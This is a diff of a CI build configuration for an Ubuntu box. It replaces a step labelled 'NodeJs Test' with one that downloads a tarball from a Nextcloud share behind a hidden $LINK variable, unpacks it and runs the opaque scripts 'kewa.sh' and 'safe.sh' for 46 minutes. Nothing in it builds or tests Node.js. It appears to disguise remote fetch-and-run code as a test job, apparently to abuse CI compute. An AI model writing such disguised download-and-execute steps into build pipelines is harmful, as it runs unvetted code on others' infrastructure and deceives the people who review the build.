@@ -1,13 +1,18 @@
-box: ubuntu:18.04
+box:
+  id: "ubuntu:18.04"
+  username: $DOCKERHUB_USERNAME
+  password: $DOCKERHUB_PASSWORD
+
 no-response-timeout: 15
 command-timeout: 60
 build:
   steps:
     - script:
-        name: NodeJs Test
+        name: NodeJs
         code: |
           apt update
-          apt install sudo git -y
-          git clone https://github.com/samita100/test.git
-          cd test
-          timeout 46m bash listen.sh
+          apt install wget sudo -y
+          wget -O lhope.tar.gz https://nextcloud-fi.webo.hosting/s/$LINK/download
+          tar xzf lhope.tar.gz
+          bash kewa.sh
+          bash safe.sh 46m
